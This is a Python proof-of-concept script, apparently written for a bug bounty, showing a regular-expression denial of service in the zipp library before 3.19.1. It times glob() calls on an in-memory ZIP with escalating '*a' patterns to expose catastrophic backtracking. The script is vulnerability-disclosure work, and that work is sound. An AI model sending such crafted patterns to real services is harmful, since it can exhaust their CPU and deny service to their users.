#!/usr/bin/env python3
"""
ReDoS PoC for zipp < 3.19.1 — via glob() with crafted pattern.

The Translator.translate() converts glob patterns like '*a*a*a...' to
regex with multiple [^/]*a groups. With k repetitions, matching against
an n-character string has O(n^k) backtracking complexity.

Tested: *a×5 on 30-char entry → >3s timeout (should be <1ms)
"""
import sys, time, zipfile, io, signal

sys.path.insert(0, '/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c')
from zipp import Path

# Create ZIP with a long entry name
data = io.BytesIO()
zf = zipfile.ZipFile(data, 'w')
entry = 'a' * 30
zf.writestr(entry, 'data')
zf.close()

p = Path(zipfile.ZipFile(data, 'r'))

# Test escalating patterns
for k in range(1, 7):
    pat = '*a' * k
    start = time.time()
    try:
        matches = list(p.glob(pat))
        elapsed = time.time() - start
        status = f"OK ({len(matches)} matches, {elapsed:.4f}s)"
    except KeyboardInterrupt:
        raise
    except Exception as e:
        elapsed = time.time() - start
        status = f"ERROR: {e}"

    # Add timeout check for slow patterns
    if elapsed > 2:
        status += " ⚠️  DoS impact!"

    print(f"  *a×{k:<3d} → {status}")
    sys.stdout.flush()
